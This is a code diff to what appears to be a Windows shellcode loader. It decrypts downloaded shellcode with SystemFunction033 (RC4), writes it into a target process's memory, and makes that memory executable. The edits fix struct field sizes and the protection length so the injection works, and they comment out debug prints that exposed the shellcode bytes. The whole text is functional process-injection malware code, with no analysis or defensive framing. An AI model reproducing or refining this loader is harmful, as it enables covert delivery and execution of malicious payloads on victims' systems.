@@ -29,8 +29,8 @@ typedef NTSTATUS(WINAPI* _SystemFunction033)(
     struct ustring* keyPointer);
 
 struct ustring {
-    USHORT Length;
-    USHORT MaximumLength;
+    DWORD Length;
+    DWORD MaximumLength;
     PUCHAR Buffer;
 } _data, key;
 
@@ -223,35 +223,35 @@ int main()
 #endif
     }
 
-	fprintf(stderr, "Shellcode size is %d\n", shellcode_size);
+//	fprintf(stderr, "Shellcode size is %d\n", shellcode_size);
 	std::copy(begin(shellcode), end(shellcode), buf);
-	fprintf(stderr, "Oofff\n");
+//	fprintf(stderr, "Oofff\n");
 
 	// decrypt the downloaded shellcode with SystemFunction033
 	key.Buffer = (PUCHAR)(&_key);
 	key.Length = sizeof(_key);
+	key.MaximumLength = sizeof(_key);
 
 	_data.Buffer = (PUCHAR)buf;
-	//_data.MaximumLength = shellcode_size;
 	//_data.Length = 0;
 	_data.Length = shellcode_size;
+	_data.MaximumLength = shellcode_size;
 
-	fprintf(stderr, "Shellcode size is %d\n", shellcode_size);
+//	fprintf(stderr, "Shellcode size is %d\n", shellcode_size);
 
-	for (i = 0; i < shellcode_size; i++) {
-		fprintf(stderr, "0x%02x ", buf[i]);
-	}
-	fprintf(stderr, "\n");
+//	for (i = 0; i < shellcode_size; i++) {
+//		fprintf(stderr, "0x%02x ", buf[i]);
+//	}
+//	fprintf(stderr, "\n");
 
 	SystemFunction033(&_data, &key);
 
-	fprintf(stderr, "Shellcode size is %d\n", shellcode_size);
+//	fprintf(stderr, "Shellcode size is %d\n", shellcode_size);
 
 #ifdef DEBUGGING
 	printf("Decrypted, press enter to continue...\n");
 	getchar();
 #endif
-
 
 	// Copy encrypted shellcode into allocated memory
 	ntstatus = NtWriteVirtualMemory(process_info->hProcess, start_address, (PVOID)buf, shellcode_size, 0);
@@ -269,10 +269,10 @@ int main()
 #endif
 	}
 
-    ntstatus = NtProtectVirtualMemory(process_info->hProcess, &start_address, (PSIZE_T)&code_size, PAGE_EXECUTE_READ, &oldProtect);
+    ntstatus = NtProtectVirtualMemory(process_info->hProcess, &start_address, (PSIZE_T)&shellcode_size, PAGE_EXECUTE_READ, &oldProtect);
     if (!NT_SUCCESS(ntstatus)) {
 #ifdef DEBUGGING
-        fprintf(stderr, "NtProtectVirtualMemory error, ntstatus is %d\n", ntstatus);
+        fprintf(stderr, "NtProtectVirtualMemory error, ntstatus is %lx\n", ntstatus);
 #endif
         return 0;
     }
